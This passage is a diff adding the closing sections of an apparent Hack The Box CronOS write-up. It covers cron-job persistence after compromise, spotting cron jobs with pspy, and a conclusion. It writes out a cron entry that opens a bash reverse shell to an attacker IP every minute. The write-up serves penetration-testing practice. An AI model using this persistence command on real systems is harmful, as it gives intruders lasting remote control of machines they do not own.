@@ -218,3 +218,42 @@ At this point, the box has been pwned :skull: but we can continue our fun by loo
 
 ## persistant access via a cron job
 
+With the box now pwned, I thought I would use a cronjob to set up persistence on the machine. This is useful just in case something happens to mess up our original way to compromise a machine.
+
+We can `echo` a malicious cronjob into a file and then use it as a user specific scheduled task:
+
+```bash
+echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.15/4446 0>&1'" > puzz00
+crontab -i puzz00
+```
+
+![persistence1](./images/24.png)
+
+![persistence2](./images/25.png)
+
+## Finding User Specific Cronjobs Using PSPY
+
+A useful utility to look for cronjobs which are running is [pspy](https://github.com/DominicBreuker/pspy)
+
+This tool lets us see running processes and it will show us user specific cronjobs.
+
+The static binaries for pspy are good, but if they are too big we can try the small versions which have an *s* at the end of their names.
+
+Once I had transferred the pspy64 binary to the victim machine and made it executable using `chmod +x pspy64` I executed it and then watched the processes. It became clear that two cronjobs were running - this is because they appeared every minute.
+
+Of course, these cronjobs were the original one and the one I set up for priv esc.
+
+The good thing is they could be seen even though I was on the machine as `www-data` and they were set up under the `root` user.
+
+![persistence3](./images/26.png)
+
+![persistence4](./images/27.png)
+
+>[!NOTE]
+>To see my hack of a box which involved using `pspy64` for privilege escalation please see my [writeup](https://github.com/puzz00/startup-thm/blob/main/startup-thm.md) of *startup* on [thm](https://tryhackme.com/r/room/startup)
+
+## conclusion
+
+I enjoyed hacking the CronOS box as it gave me a good opportunity to practice enumerating a linux machine and exploit a cronjob file overwrite vulnerability.
+
+Thanks to *ch4p* for creating it - and thank you to *you* for reading it :fist:
